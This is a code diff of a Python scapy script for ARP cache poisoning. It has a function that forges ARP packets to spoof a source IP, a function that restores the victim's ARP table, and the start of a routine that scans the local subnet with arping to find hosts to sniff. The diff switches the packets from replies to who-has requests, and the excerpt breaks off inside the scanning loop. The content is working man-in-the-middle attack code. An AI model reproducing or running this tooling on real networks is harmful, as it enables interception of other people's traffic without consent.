@@ -1,20 +1,19 @@
 from scapy.layers.l2 import *
-from scapy.sendrecv import send
+from scapy.sendrecv import sr
 
 result = []
 
 def spoofarpcache(targetip, targetmac, sourceip):
-    spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
-    result.append(send(spoofed, verbose= False))
+    spoofed= ARP(op=ARP.who_has , pdst=targetip, psrc=sourceip, hwdst= targetmac)
+    result.append(sr(spoofed, verbose= False))
 
 def restorearp(targetip, targetmac, sourceip, sourcemac):
-    packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
-    result.append(send(packet, verbose=False))
+    packet= ARP(op=ARP.who_has , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
+    result.append(sr(packet, verbose=False))
     print("ARP Table restored to normal for", targetip)
 
 def MultiSniffing():
     ipt = {}
-    var = False
     ip = ".".join(conf.route.route("0.0.0.0")[1].split(".")[:-1]) + "."
     for num in range(1, 254):
         if str(arping(ip + str(num))[0])[-2] != "0":
